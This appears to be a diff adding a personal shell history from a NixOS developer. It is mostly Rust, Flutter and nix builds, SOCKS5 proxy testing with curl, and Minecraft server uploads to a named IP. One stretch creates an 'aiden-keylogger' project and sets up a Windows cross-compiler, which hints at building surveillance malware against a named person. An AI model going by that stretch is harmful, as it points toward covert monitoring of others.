@@ -1,0 +1,1474 @@
+devenv $env.config = {<\n>  hooks: {<\n>    pre_prompt: [{ ||<\n>      if (which direnv | is-empty) {<\n>        return<\n>      }<\n><\n>      direnv export json | from json | default {} | load-env<\n>    }]<\n>  }<\n>}
+$nu.env-path
+code /home/jj/.config/nushell/env.nu
+$env.config
+cd ..
+cd not-monotomt
+cd not-monotomy
+$env.config
+cargo
+which direnv | is-empty
+sd
+cargo
+direnv
+direnv export json
+cargo
+devenv shell
+devenv shell --help
+printenv
+devenv shell nu
+printenv
+cargo build
+printenv
+printenv > env
+printenv > asd
+printenv | save env
+printenv | save env1
+rm env env1
+code $nu.config
+code $nu.config-path
+$env.DEVNEV
+$env | select DEVENV_NIX
+$env | select DEVENV_NIX | empty?
+exit
+devenv shell nu
+$env | select DEVENV_NIX
+cargo run --release
+code /tmp/out/1080.png
+cargo run --release
+cargo run 
+cargo run --release
+clear
+cargo run --release
+grep ~/.cargo/registry/src/index.crates.io-6f17d22bba15001f/dictionary2-1.0.1/src/lib.rs
+grep ~/.cargo/registry/src/index.crates.io-6f17d22bba15001f/dictionary2-1.0.1/src/lib.rs stfu
+grep stfu ~/.cargo/registry/src/index.crates.io-6f17d22bba15001f/dictionary2-1.0.1/src/lib.rs
+vim ~/.cargo/registry/src/index.crates.io-6f17d22bba15001f/dictionary2-1.0.1/src/lib.rs
+clear
+sudo waydroid init
+sudo vim /var/lib/waydroid/waydroid_base.prop
+systemctl enable --now waydroid-container
+cd /tmp
+git clone https://github.com/casualsnek/waydroid_script<\n>cd waydroid_script<\n>python3 -m venv venv<\n>venv/bin/pip install -r requirements.txt<\n>sudo venv/bin/python3 main.py
+nix-shell -p python
+nix-shell -p python311
+ls
+cd game-downloads
+ls
+cargo run --release
+cargo run
+cargo run --release
+RUST_FLAGS="-Ctarget-cpu=native" cargo run --release
+RUSTFLAGS="-Ctarget-cpu=native" cargo run --release
+reboot
+sudo vim /etc/nixos/configuration.nix
+lks
+ls
+cd KEY
+ls
+unzip keys.zip
+ls
+unzip keys.zip
+nix-shell -p unzip
+ls
+scp world opc@129.80.189.92:. -i ssh-key-2022-09-12.key
+scp world opc@129.80.189.92:.
+scp -r -i ssh-key-2022-09-12.key world opc@129.80.189.92:.
+ssh opc@129.80.189.92 -i ssh-key-2022-09-12.key
+scp -r -i ssh-key-2022-09-12.key world opc@129.80.189.92:.
+scp -r -i ssh-key-2022-09-12.key world_nether/ opc@129.80.189.92:.
+scp -r -i ssh-key-2022-09-12.key world_the_end/ opc@129.80.189.92:.
+ssh opc@129.80.189.92 -i ssh-key-2022-09-12.key
+cd KEY
+ssh opc@129.80.189.92 -i ssh-key-2022-09-12.key
+curl http://mc.jjay.dev/
+curl 129.80.189.92
+curl http://mc.jjay.dev/
+cd /tmp
+vim a.html
+open a.html
+firefox a.html
+code a.html
+sbctl
+sudo vim /etc/nixos/flake.nix
+sudo vim /etc/nixos/configuration.nix
+nix-shell -p helix
+ls
+cd dotfiles
+ls
+cd root
+ls
+cd etc
+ls
+cd ..
+ls -la
+cd ,,
+ls
+cd ..
+ls
+mv wallpapers ../
+ls
+mv scripts ../
+mv passthrough ../
+ls
+mv cmd_history.txt init-cloud-providers.sh install.log jrnl.txt
+ls
+mv cmd_history.txt init-cloud-providers.sh install.log jrnl.txt ../
+cd ..
+ls
+nix-shell -p chezmoi
+:q
+exit
+:q
+exit
+ls
+ssh opc@129.80.189.92 -i ssh-key-2022-09-12.key
+cd KEY
+ls
+cd KEY
+ssh opc@129.80.189.92 -i ssh-key-2022-09-12.key
+ls
+cd sub
+ls
+reboot
+pw-loopback
+git pull
+cd client
+flutter run
+flutter_rust_bridge_codegen generate
+flutter config --build-dir=/tmp/flutter-build
+cargo upgrade flutter_rust_bridge_codegen
+cargo install flutter_rust_bridge_codegen
+cargo install flutter_rust_bridge_codegen@2.0.0-dev.40
+flutter_rust_bridge_codegen generate
+devenv help
+devenv update
+cd ../
+devenv update
+cd client
+devenv update
+flutter_rust_bridge_codegen generate
+flutter_rust_bridge_codegen version
+flutter_rust_bridge_codegen --version
+cargo install flutter_rust_bridge_codegen@2.0.0-dev.40
+flutter_rust_bridge_codegen generate
+flutter --version
+devenv update
+cd ..
+devenv update
+which flutter
+devenv update
+cd client
+flutter_rust_bridge_codegen generate
+flutter --version
+sudo vim /etc/nixos/configuration.nix
+devenv shell nu
+devenv shell
+which flutter
+cd client
+flutter_rust_bridge_codegen generate
+flutter --version
+devenv update
+cd ..
+devenv update
+sudo nixos-rebuild switch --upgrade
+cd client
+flutter build
+flutter run
+sudo nix-channel --list
+flutter upgrade
+flutter profile beta
+flutter channel beta
+flutter version
+flutter -v
+flutter --version
+reboot
+clear
+which flutter
+devenv shell
+flutter --version
+sudo vim /etc/nixos/configuration.nix
+nix profile install --accept-flake-config nixpkgs#devenv
+devenv --version
+devenv 
+devenv version
+flutter --versiongit pull
+git pull
+cd client
+flutter run
+git pull
+cd ..
+git pull
+clear
+devenv shell
+devenv update
+devenv shell
+nix-channel --list
+devenv update
+devenv shell nu
+cd client
+flutter run
+devenv update
+cd ..
+devenv update
+cd client
+flutter run
+dart --version
+devenv upgrade
+cd ..
+ls
+devenv up
+clear
+rm -rf .devenv
+rm -rf .direnv
+echo $CARGO_OUTPUT_DIR
+echo $env.CARGO_OUTPUT_DIR
+echo $env.CARGO_TARGET_DIR
+code $nu.config-path
+code $nu.env-path
+flutter --version
+cd client
+flutter run
+flutter pug update
+flutter pub update
+flutter pub get
+flutter pub add dev:freezed:^2.5.2
+flutter run
+flutter run --verbose
+$env.CARGO_TARGET_DIR = /tmp/cargo
+flutter run --verbose
+cargo clean
+rm -rf target
+flutter run --verbose
+flutter clean
+flutter run --verbose
+flutter run --verbose 
+cd ../launcher
+cargo add color-eyre
+cargo remove rfd
+cargo run
+cd launcher
+cargo run
+git pull
+clear
+ls
+cd ..
+git clone https://github.com/thebotlynoob/dirtysocks
+code dirtysocks
+cargo run
+code ../bramlett/
+ls
+cd ../dirtysock/
+devenv init
+code .
+cargo build
+cd ..
+rm -rf dirtysock
+code dirtysocks
+devenv init
+\
+cargo build
+direnv allow
+clear
+cargo build
+curl --socks5 localhost:5000 https://example.com
+curl --socks5 localhost:3000 https://example.com
+RUST_LOG="debug" cargo run
+sudo nixos-rebuild switch --upgrade
+reboot
+sudo nix-channel --list
+sudo nix-channel --update
+sudo nixos-rebuild switch
+sudo nix-channel --list
+nix-channel --add https://nixos.org/channels/nixos-unstable nixos
+sudo nix-channel --update
+sudo nix-channel --add https://nixos.org/channels/nixos-24.05 nixos
+sudo nix-channel --update
+sudo nixos-rebuild switch
+sudo vim /etc/nixos/configuration.nix
+sudo vim /etc/nixos/fla
+sudo vim /etc/nixos/flake.nix
+sudo nixos-rebuild switch --flake /etc/nixos/flake.nix#JJ-Desktop
+sudo nixos-rebuild switch --flake /etc/nixos#JJ-Desktop
+sudo vim /etc/nixos/flake.nix
+nix
+sudo vim /etc/nixos/flake.nix
+reboot
+vim .config/kitty/kitty.conf
+clear
+vim .config/kitty/kitty.conf
+sudo vim /etc/nixos/configuration.nix
+nvim
+vim .config/kitty/kitty.conf
+clear
+cargo run
+cargo build
+devenv shell nu
+devenv update
+cargo run
+cargo clean
+cargo run
+rm -rf target
+htop
+top
+cargo run
+pkill not-monotony
+cargo run
+pkill not-monotomy
+pkill not-monotomy\
+cargo run
+code .config/nushell/config.nu
+reboot
+nix-shell -p rustdesk
+export NIXPKG_ALLOW_UNFREE=1
+export NIXPKG_ALLOW_UNFREE 1
+$env.NIXPKG_ALLOW_UNFREE = 1
+nix-shell -p rustdesk
+ls
+mkdir aiden-keylogger
+cd aiden-keylogger
+code main.cpp
+nix-shell -p mingw-w64
+nix-shell -p pkgsCross.mingwW64.buildPackages.gcc<\n>
+nix-shell -p pkgsCross.mingwW64
+nix-shell -p pkgsCross.mingwW64.buildPackages.gcc
+cd /etc/nixos/
+nix flake update
+sudo nix flake update
+sudo nixos-rebuild switch --flake /etc/nixos#JJ-Desktop
+sudo vim /etc/nixos/configuration.nix
+cd -
+code .
+nix-shell crossShell.nix
+reboot
+cd /etc/nixos/
+sudo nix flake update
+sudo vim 
+sudo vim /etc/nixos/configuration.nix
+sudo vim /etc/nixos/flake.inx
+sudo vim /etc/nixos/flake.nix
+sudo nix flake update
+sudo vim /etc/nixos/flake.nix
+sudo nix flake update
+sudo nixos-rebuild switch --flake /etc/nixos#JJ-Desktop
+klaker
+kalker
+reboot
+shutdown now
+reboot
+pkill signal
+shutdown now
+shut
+shutdown now
+cd github/bas
+make
+ls
+make
+cd /tmp
+git clone https://github.com/wernsey/chip8
+vim .config/hypr/hyprland.conf
+vim .config/hypr/monitors.conf
+time
+date
+date humanize
+date now
+shutdown now
+reboot
+cd /etc/nixos
+sudo nix flake update
+devenv init
+sudo nixos-rebuild switch --flake .
+devenv shell nu
+devenv inputs add fenix github:nix-community/fenix --follows nixpkgs
+cargo run
+devenv shell nu
+clang
+cargo run
+devenv shell nu
+cargo run
+devenv shell nu
+cargo run
+devenv shell nu
+sudo vim /etc/nixos/flake.nix
+sudo vim /etc/nixos/configuration.nix
+cd /etc/nixos
+sudo flake update
+sudo nix flake update
+sudo nixos-rebuild switch --flake .
+cd -
+cargo run
+nix-ld
+devenv shell nu
+cargo run
+echo $env.LD_LIBRARY_PATH
+cargo run
+devenv shell nu
+cargo run
+devenv shell nu
+cargo run
+vim /etc/nixos
+sudo vim /etc/nixos
+sudo nixos-rebuild switch --flake .
+cd /etc/nixos
+sudo nixos-rebuild switch --flake .
+bash
+exit
+devenv shell nu
+devenv shell
+vulkaninfo
+cd /etc/nixos
+sudo vim .
+devenv shell nu
+vulkaninfo
+export LD_LIBRARY_PATH=""
+$env.LD_LIBRARY_PATH=""
+$env.LD_LIBRARY_PATH = ""
+vulkaninfo
+clear
+devenv shell nu
+vulkaninfo
+cargo run
+$env.WINIT_UNIX_BACKEND = "vulkan"
+cargo run
+$env.WINIT_UNIX_BACKEND = "vulkan"
+cargo run
+devenv shell nu
+vulkaninfo
+nix run --impure github:nix-community/nixGL -- bash
+nix run --impure github:nix-community/nixGL#nixVulkanIntel -- vulkaninfo
+cargo run
+git pull
+rm -rf target
+git pull
+cargo run
+code ~/.cargo/config.toml
+rm -rf target
+cargo run
+cargo clean
+time cargo build
+cargo clean
+curl --socks5 localhost:3000 https://example.com
+curl --socks5 localhost:3000 -L https://example.com
+curl --socks5 localhost:3000 -vvv https://example.com
+curl --socks5 localhost:3000 -vvv https://ash-speed.hetzner.com/1GB.bin
+curl --socks5 localhost:3000 -vvv https://ash-speed.hetzner.com/1GB.bin -o /dev/null
+curl --socks5 localhost:3000 -vvv https://ash-speed.hetzner.com/100MB.bin -o /dev/null
+cargo run
+reboot
+clear
+cargo run
+cargo build
+shutdown now
+cargo build
+reboot
+shutdown now
+cd Downloads/
+open signal-2024-09-15-224121_004.jpeg
+firefox signal-2024-09-15-224121_004.jpeg
+shutdown now
+cd /etc/nixos
+sudo nix flake update
+sudo nixos-rebuild switch --flake .
+hyprshot
+shutdown now
+spotify
+spotify https://spotify.link/y1uKmDzBYMb
+SHUTDOWN NOW
+shutdown now
+cd /etc/nixos
+sudo flake update
+sudo nix flake update
+sudo nixos-rebuild switch --flake .
+cd github
+git clone https://github.com/thebotlynoob/ws-ftc
+code ws-ftc
+yarn dev
+devenv init
+code devenv.nix
+yarn add @fontsource-variable/montserrat
+devenv shell
+yarn add @fontsource-variable/montserrat
+yarn add -D sass-embedded
+shutdown now
+git pull
+ls
+unzip firsttechchallenge-logo-all-formats.zip
+ls
+cd FIRSTTechChallenge-IconVertical/
+ls
+git pull
+yarn dev
+flatpak update
+reboot
+shutdown now
+reboot
+sudo nix flake update /etc/nixos
+sudo nixos-rebuild switch --flake /etc/nixos
+shutdown now
+reboot
+sudo nix flake update /etc/nixos
+sudo nixos-rebuild switch --flake /etc/nixos
+reboot
+git pull
+cargo buidl
+cargo build
+curl --socks5 localhost:3000 -vvv https://ash-speed.hetzner.com/100MB.bin -o /dev/null
+curl --socks5 localhost:3000 -vvv https://github.com/BitDoctor/speed-test-file/raw/refs/heads/master/5mb.txt -o /dev/null
+curl --socks5 localhost:3000 -vvv https://github.com/BitDoctor/speed-test-file/raw/refs/heads/master/5mb.txt
+curl --socks5 localhost:3000 -vvv https://example.com
+curl --socks5 localhost:3000 -vvv http://localhost
+cargo run
+curl --socks5 localhost:3000 -vvv http://abc.com
+cargo run
+curl --socks5 localhost:3000 -vvv http://abc.com
+cargo run
+curl --socks5 localhost:3000 -vvv http://abc.com
+shutdown now
+sudo vim /etc/nixos/configuration.nix
+sudo nix flake update /etc/nixos
+sudo nixos-rebuild switch --flake /etc/nixos
+shutdown now
+curl --socks5 localhost:3000 -vvv http://localhost
+go
+function go
+alias go="curl --socks5 localhost:3000 -vvv http://localhost "
+alias go = "curl --socks5 localhost:3000 -vvv http://localhost"
+alias go = curl --socks5 localhost:3000 -vvv http://localhost
+go
+alias r = cargo run
+r
+go
+alias go = curl --socks5 localhost:3000 -vvv http://example.com
+go
+clezR
+clear
+go
+r
+clear
+time go
+time curl --socks5 localhost:3000 -vvv http://example.com
+clear
+time curl --socks5 localhost:3000 -vvv http://example.com
+r
+time curl --socks5 localhost:3000 -vvv http://example.com
+hyperfine curl --socks5 localhost:3000 -vvv http://example.com
+hyperfine 'curl --socks5 localhost:3000 -vvv http://example.com'
+clear
+r
+hyperfine 'curl --socks5 localhost:3000 -vvv http://example.com'
+hyperfine --warmup 'curl --socks5 localhost:3000 -vvv http://example.com'
+hyperfine --warmup 2 'curl --socks5 localhost:3000 -vvv http://example.com'
+hyperfine --warmup 2 'curl --socks5 localhost:3000 -vvv https://example.com'
+r
+cargo run --release
+hyperfine --warmup 2 'curl --socks5 localhost:3000 -vvv https://example.com'
+RUST_LOG=none cargo run --release
+hyperfine --warmup 2 'curl --socks5 localhost:3000 -vvv https://example.com'
+cargo run --release
+hyperfine --warmup 2 'curl --socks5 localhost:3000 -vvv https://example.com'
+curl --socks5 localhost:3000 -vvv http://example.com
+cargo run --release
+curl --socks5 localhost:3000 -vvv http://example.com
+hyperfine --warmup 2 'curl --socks5 localhost:3000 -vvv https://example.com'
+curl --socks5 localhost:3000 -vvv http://example.com
+wireproxy
+hyperfine --warmup 2 'curl --socks5 localhost:3000 -vvv https://example.com'
+wireproxy -c wgcf-profile.conf
+cargo run --release
+hyperfine --warmup 2 'curl --socks5 localhost:3000 -vvv https://example.com'
+top
+cargo run --release
+curl --socks5 localhost:3000 -vvv http://example.com
+curl --socks5 localhost:3000 -vvv https://example.com
+curl --socks5 localhost:3000 -vvv https://ash-speed.hetzner.com/100MB.bin
+curl --socks5 localhost:3000 -vvv https://ash-speed.hetzner.com/100MB.bin -o /dev/null
+cargo run --release
+wireproxy -c wgcf-profile.conf
+nix-shell -p htop
+hyperfine --warmup 2 'curl --socks5 localhost:3000 -vvv https://example.com'
+hyperfine --warmup 2 'curl --socks5 localhost:3000 -vvv http://example.com'
+cargo run --release
+shutdown now
+cd Downloads
+mv `Sophia Kero - AP World History_ Unit 2 Study Guide.pdf` AP-World-Study-Guide.pdf
+shutdown now
+git pull
+cargo run --release
+shutdown now
+cd /etc/nixos
+sudo nix flake update /etc/nixos
+sudo nixos-rebuild switch --flake /etc/nixos
+hyperfine
+devenv shell nu
+cargo run --release
+hyperfine --warmup 2 'curl --socks5 localhost:3000 -vvv http://example.com'
+cargo run --release
+cd Downloads/
+mv '[Les histoires inedites du Petit Nicolas №1] Госинни, Рене _ - libgen.li.pdf' petit-nicolas.pdf
+shutdown now
+git pull
+reboot
+sudo nix flake update /etc/nixos
+sudo nixos-rebuild switch --flake /etc/nixos
+sudo vim /etc/nixos/configuration.nix
+sudo nix flake update /etc/nixos
+sudo nixos-rebuild switch --flake /etc/nixos
+fc-list
+fc-list | grep nerd
+fc-list | grep Nerd
+fc-list | grep Fira
+fc-list
+sudo vim /etc/nixos/configuration.nix
+nix-shell -p fira-code-nerdfont
+sudo nixos-rebuild switch --flake /etc/nixos
+fc-list
+clear
+fc-list
+git pull
+gh
+nix-shell -p github-cli
+git pull
+sudo vim /etc/nixos/configuration.nix
+sudo nixos-rebuild switch --flake /etc/nixos
+git pull
+ls
+vim ../../.gitconfig
+git pull
+reboot
+git pull
+cd ./.
+cd ..
+gh clone dirtysocks
+gh repo clone dirtysocks
+code dirtysocks
+git pull
+git checkout main
+git checkout master
+git pull
+curl --socks5 localhost:3000 -vvv https://ash-speed.hetzner.com/100MB.bin -o /dev/null
+cargo run 
+shutdown now
+reboot
+nmctl
+iw
+help
+networkmanagerctl
+networkctl 
+nmcli 
+sudo nmtui
+clear
+nmcli
+pw-
+pw-loopback
+ls
+cd Downloads
+ls
+cd ../
+ls
+cd onedrive/
+ls
+ls -la
+reboot
+sudo mount /dev/sda /mnt
+cd /mnt
+ls
+sudo fdisk -l
+sudo mount /dev/sda /mnt/a
+sudo mkdir a
+sudo mount /dev/sda /mnt/a
+reboot
+cd /mnt/windows
+ls
+cd Users/
+ls
+cd thebo
+ls
+ls -la
+cat OneDrive
+ls
+yazi
+cd AppData/
+ls
+cd Local
+ls
+ls -la
+cd OMORI
+ls
+cd ../
+cd .../
+cd ..
+cd ../
+ls
+cd `Program Files/`
+ls
+cd `../Program Files (x86)/`
+ls
+cd ../../
+cd windows/
+fd
+fd OMORI.exe
+cd Users/thebo/scoop/persist/steam/steamapps/common/OMORI/
+ls
+cd www
+ls
+ls save
+cp -r mods package.json index.html `OMO CEP.txt` ~/.local/share/Steam/steamapps/common/OMORI/www
+ls
+cd www
+code index.html
+cd 
+cd -
+cd ..
+ls
+whoami
+cd ~
+ls
+cat log123.txt
+cd ..
+ls
+cd www
+ls
+cp -r modloader ~/.local/share/Steam/steamapps/common/OMORI/www
+cd -
+reboot
+cargo run
+cargo doc --open
+cargo run
+cargo run --release
+cargo run
+cargo clean
+cargo run
+cd .cargo/
+clear
+cd registry/
+ls
+cd index/
+ls
+cd index.crates.io-6f17d22bba15001f/
+ls
+cd ../../
+ls
+cd cache
+ls
+cd index.crates.io-6f17d22bba15001f/
+ls
+cd dictionary2
+ls
+cat dictionary2-1.0.1.crate
+cd ..
+ls
+clea
+cd ..
+clear
+cd ..
+ls
+cd registry/
+ls
+cd src/
+ls
+cd index.crates.io-6f17d22bba15001f/
+ls
+cd dictionary2-1.0.1/
+ls
+vim src/lib.rs
+cargo run
+clear
+cargo clean
+clear
+cargo run
+cargo run | less
+cargo run 2>&1 | less
+cargo run out+err> | less
+cargo run err>out | less
+cargo run out+err>out | less
+cargo run out+err>out | less --help
+cargo build
+cd ~/.cargo/registry/src/index.crates.io-6f17d22bba15001f/dictionary2-1.0.1
+ls
+cargo build
+ls
+cd src
+vim lib.rs
+cd ..
+ls
+cd ~/github/not-monotomy/
+ls
+cargo run
+clear
+cargo run
+clear
+cargo run
+cargo run out+err>out.txt
+cargo run | pipe
+kitty .
+pipe
+help
+help commands
+kitty . &
+cargo run
+]
+cargo run
+reboot
+git pull
+nmcli
+cargo run
+cd ..
+git clone https://github.com/spacemeowx2/tokio-smoltcp
+code tokio-smoltcp/
+cd dirtysocks
+cargo tree | grep futures
+cargo tree
+cargo add futures-util
+cargo run
+cargo run
+curl --socks5 localhost:3000 -vvv http://example.com
+cargo run
+RUST_LOG=trace cargo run
+cargo run
+curl --socks5 localhost:3000 -vvv http://example.com
+clear
+curl --socks5 localhost:3000 -vvv http://example.com
+RUST_LOG=trace cargo run
+curl --socks5 localhost:3000 -vvv http://example.com\
+curl --socks5 localhost:3000 -vvv http://example.com
+alias r='RUST_LOG=trace cargo run'
+alias r = RUST_LOG=trace cargo run
+r
+alias r = 'RUST_LOG=trace cargo run'
+alias r = eval 'RUST_LOG=trace cargo run'
+r
+run
+eval
+start
+start --help
+$env.RUST_LOG='trace'
+$env.RUST_LOG=trace
+$env.RUST_LOG = trace
+$env.RUST_LOG = 'trace'
+alias r = cargo run
+r
+alias c = curl --socks5 localhost:3000 -vvv http://example.com
+c
+r
+c
+r
+alias c = curl --socks5 localhost:3000 -vvv https://example.com
+c
+alias cs = curl --socks5 localhost:3000 -vvv https://example.com
+alias c = curl --socks5 localhost:3000 -vvv http://example.com
+c
+r
+c
+cs
+r --release
+bash
+r --release
+cs
+r
+cs
+re
+c
+cs
+r
+wireproxy -c wgcf-profile.conf
+nix-shell -p wireproxy
+c
+cs
+wireproxy -c wgcf-profile.conf
+hyprfine
+hyperfine
+devenv shell nu
+exit
+devenv shell nu
+hyperfine
+hyperfine --warmup 2 'curl --socks5 localhost:3000 -vvv https://example.com'
+hyperfine --warmup 2 'curl --socks5 localhost:3000 -vvv https://example.com' --help
+hyperfine --warmup 2 'curl --socks5 localhost:3000 https://example.com'
+wireproxy -c wgcf-profile.conf
+cargo run --release
+hyperfine --warmup 2 'curl --socks5 localhost:3000 https://example.com'
+RUST_LOG=none cargo run --release
+git pull
+curl --socks5 localhost:3000 -vvv https://ash-speed.hetzner.com/100MB.bin -o /dev/null
+wireproxy -c wgcf-profile.conf
+curl --socks5 localhost:3000 -vvv https://ash-speed.hetzner.com/100MB.bin -o /dev/null
+cargo run --release
+reboot
+rebppt
+reboot
+shutdown now
+reboot
+code ../dirtysocks
+curl --socks5 localhost:3000 -vvv https://ash-speed.hetzner.com/100MB.bin -o /dev/null
+cargo run --release
+clear
+cargo run --release
+curl --socks5 localhost:3000 -vvv https://ash-speed.hetzner.com/100MB.bin -o /dev/null
+clear
+git pull
+git pull --merge
+cargo run --release
+curl --socks5 localhost:3000 -vvv https://ash-speed.hetzner.com/100MB.bin -o /dev/null
+cargo run --release
+curl --socks5 localhost:3000 -vvv https://ash-speed.hetzner.com/100MB.bin -o /dev/null
+curl --socks5 localhost:3000 -vvv https://example.com-o /dev/null
+curl --socks5 localhost:3000 -vvv https://example.com -o /dev/null
+curl --socks5 localhost:3000 -vvv https://example.com 
+cargo run --release
+curl --socks5 localhost:3000 -vvv https://example.com 
+curl --socks5 localhost:3000 -vvv https://ash-speed.hetzner.com/100MB.bin -o /dev/null
+cargo run --release
+curl --socks5 localhost:3000 -vvv https://example.com 
+cargo run --release
+cargo add futures-util
+cargo add rename-future
+cargo run --release
+curl --socks5 localhost:3000 -vvv https://example.com 
+cargo run --release
+curl --socks5 localhost:3000 -vvv https://example.com 
+curl --socks5 localhost:3000 -vvv https://ash-speed.hetzner.com/100MB.bin -o /dev/null
+curl --socks5 localhost:3000 -vvv https://gitlab.com/api/v4/projects/44042130/packages/generic/librewolf/131.0.2-1/librewolf-131.0.2-1-windows-x86_64-portable.zip -o /dev/null
+cargo run --release
+curl --socks5 localhost:3000 -vvv https://gitlab.com/api/v4/projects/44042130/packages/generic/librewolf/131.0.2-1/librewolf-131.0.2-1-windows-x86_64-portable.zip -o /dev/null
+cargo run --release
+cargo add altuntun
+cargo build
+cargo run --release
+curl --socks5 localhost:3000 -vvv https://gitlab.com/api/v4/projects/44042130/packages/generic/librewolf/131.0.2-1/librewolf-131.0.2-1-windows-x86_64-portable.zip -o /dev/null
+cargo run --release
+curl --socks5 localhost:3000 -vvv https://gitlab.com/api/v4/projects/44042130/packages/generic/librewolf/131.0.2-1/librewolf-131.0.2-1-windows-x86_64-portable.zip -o /dev/null
+cargo run --release
+curl --socks5 localhost:3000 -vvv https://gitlab.com/api/v4/projects/44042130/packages/generic/librewolf/131.0.2-1/librewolf-131.0.2-1-windows-x86_64-portable.zip -o /dev/null
+RUST_LOG=none cargo run --release
+RUST_LOG=none cargo run 
+curl --socks5 localhost:3000 -vvv https://gitlab.com/api/v4/projects/44042130/packages/generic/librewolf/131.0.2-1/librewolf-131.0.2-1-windows-x86_64-portable.zip -o /dev/null
+cargo run 
+clear
+cargo run 
+curl --socks5 localhost:3000 -vvv https://gitlab.com/api/v4/projects/44042130/packages/generic/librewolf/131.0.2-1/librewolf-131.0.2-1-windows-x86_64-portable.zip -o /dev/null
+shutdown now
+clear
+cargo run
+curl --socks5 localhost:3000 -vvv https://gitlab.com/api/v4/projects/44042130/packages/generic/librewolf/131.0.2-1/librewolf-131.0.2-1-windows-x86_64-portable.zip -o /dev/null
+cargo run
+cargo run --release
+curl --socks5 localhost:3000 -vvv https://gitlab.com/api/v4/projects/44042130/packages/generic/librewolf/131.0.2-1/librewolf-131.0.2-1-windows-x86_64-portable.zip -o /dev/null
+cargo run --release
+shutdown now
+reboot
+sudo nix flake update /etc/nixos
+sudo nixos-rebuild switch --flake /etc/nixos
+ps -aux
+ps
+ps | grep vesktop
+pkill electron
+cd one
+cd onedrive/
+ls
+shutdown now
+cargo run --release
+curl --socks5 localhost:3000 -vvv https://gitlab.com/api/v4/projects/44042130/packages/generic/librewolf/131.0.2-1/librewolf-131.0.2-1-windows-x86_64-portable.zip -o /dev/null
+sudo /tmp/cargo/release/dirtysocks 
+curl --socks5 localhost:3000 -vvv https://gitlab.com/api/v4/projects/44042130/packages/generic/librewolf/131.0.2-1/librewolf-131.0.2-1-windows-x86_64-portable.zip -o /dev/null
+ipconfig
+shutdown now
+sudo nix flake update /etc/nixos
+cd /etc/nixos
+sudo nix flake update /etc/nixos
+sudo nix flake update 
+git pull
+git checkout master
+git diff
+git reset HEAD --hard
+git pull
+sudo nixos-rebuild switch --flake /etc/nixos
+git checkout master
+git pull master
+git pull
+git reset HEAD --hard
+git pull
+git pul
+git pul;
+git pull
+git fetch
+git pull
+curl --socks5 localhost:3000 -vvv https://gitlab.com/api/v4/projects/44042130/packages/generic/librewolf/131.0.2-1/librewolf-131.0.2-1-windows-x86_64-portable.zip -o /dev/null
+cargo run
+curl --socks5 localhost:3000 -vvv https://gitlab.com/api/v4/projects/44042130/packages/generic/librewolf/131.0.2-1/librewolf-131.0.2-1-windows-x86_64-portable.zip -o /dev/null
+hyperfine --warmup 2 'curl --socks5 localhost:3000 https://example.com'
+cargo run
+wireproxy -c wgcf-profile.conf
+curl --socks5 localhost:3000 -vvv https://gitlab.com/api/v4/projects/44042130/packages/generic/librewolf/131.0.2-1/librewolf-131.0.2-1-windows-x86_64-portable.zip -o /dev/null
+cargo run
+curl --socks5 localhost:3000 -vvv https://gitlab.com/api/v4/projects/44042130/packages/generic/librewolf/131.0.2-1/librewolf-131.0.2-1-windows-x86_64-portable.zip -o /dev/null
+cargo build --profile profiling
+cargo run --profile profiling
+samply
+devenv shell nu
+devenv shell
+nixos-gc
+sudo nix-collect-garbage
+devenv shell
+devenv update
+cd github/dirtysocks/
+ls
+devenv update
+reboot
+devenv shell
+cargo
+devenv shell --verbose
+devenv shell --help
+devenv update --verbose
+devenv update --help
+devenv --verbose shell
+devenv --help
+devenv -v update
+nix --show-trace --extra-experimental-features nix-command --extra-experimental-features flakes --option warn-dirty false --option eval-cache false --keep-going --max-jobs 16 flake update
+devenv -v update 
+devenv gc
+shutdown now
+cargo build --profile profiling
+devenv shell nu
+cd /etc/nixos
+sudo flake update
+sudo nix flake update
+sudo nixos-rebuild switch --flake /etc/nixos
+cd -
+devenv shell nu
+shutdown now
+git pull
+reboot
+git pull
+cd ws/year-3/
+ls
+chmod +x start-solving.py
+./start-solving.py stranger shells 2
+cd ..
+devenv init
+devenv shell nu
+cd /etc/nixos
+sudo nix flake update
+sudo nixos-rebuild switch --flake /etc/nixos
+cd -
+cd Downloads/
+ls
+ls nes_games/
+ls
+open 2024-10-29-215423_hyprshot.png
+nix-shell -p nautlius
+shutdown now
+cd Documents/ls
+cd Downloads
+mkdir meme-viewer
+tar -xvf app.tar.gz -C meme-viewer/
+cd meme-viewer/
+./meme_viewer_v1
+patchelf
+shutdown now
+reboot
+shutdown now
+signal
+git pull
+shutdown ow
+shutdown now
+cd /etc/nixos
+sudo flake update
+sudo nix flake update
+sudo nixos-rebuild switch --flake /etc/nixos
+ls
+cd ~/github
+ls
+cd ctf
+devenv shell nu
+devenv shell nu --verbose
+devenv --verbose shell nu 
+shutdown now
+devenv --version
+devenv version
+sudo vim /etc/nixos/configuration.nix
+sudo vim /etc/nixos/flake.nix
+nix profile
+nix profile install --accept-flake-config nixpkgs#devenv
+devenv version
+sudo vim /etc/nixos/flake.nix
+sudo vim /etc/nixos/configuration.nix
+sudo nix flake update
+cd /etc/nixos
+sudo nix flake update
+sudo nixos-rebuild switch --flake /etc/nixos
+devenv version
+rm -rf .devenv
+devenv version
+cd -
+devenv version
+nix profile
+nix profile list
+nix profile removedevenv
+nix profile remove devenv
+sudo nixos-rebuild switch --flake /etc/nixos
+devenv version
+devenv shell
+devenv --verbose shell
+nix-shell -p python3
+nix-shell -p qt5
+clear
+devenv --verbose shell
+pio
+devenv shell nu
+pio
+cd westshore/2024/hardware/hardware-hacking/
+pio
+pio run
+pio project init
+pio project
+pio project config
+pio pkg install --library "adafruit/Adafruit GFX Library@^1.11.11"
+pio project
+pio pkg install --library "adafruit/Adafruit GFX Library@^1.11.11"
+pio pkg install --library "adafruit/Adafruit SSD1306@^2.5.13"
+pio build
+pio project build
+pio project -h
+pio -h
+pio run build
+pio run
+cd pt2
+cd pt-3
+cd pt-2
+ls /sys/class/tty
+sudo dmsg
+sudo dmesg
+screen
+nix-shell -p screen
+sudo dmesg --help
+sudo dmesg -w
+nix-shell -p screen
+cd game-downloads/
+ls
+cd ktane
+ls
+cd steamapps/common/
+ls
+cd ../
+cd ..
+ls
+cd ktane
+ls
+./ktane.exe
+proton
+proton-ge
+wine-ge
+wine
+nix-shell -p wine
+nix-shell -p proton
+nix-shell -p proton-ge
+nix-shell -p proton-ge-custom
+nix-shell -p proton-ge-bin
+ls
+proton-ge
+proton
+git pull
+devenv update
+cargo update
+devenvs shell nu
+devenv shell nu
+devenv update
+cd client
+flutter run --verbose 
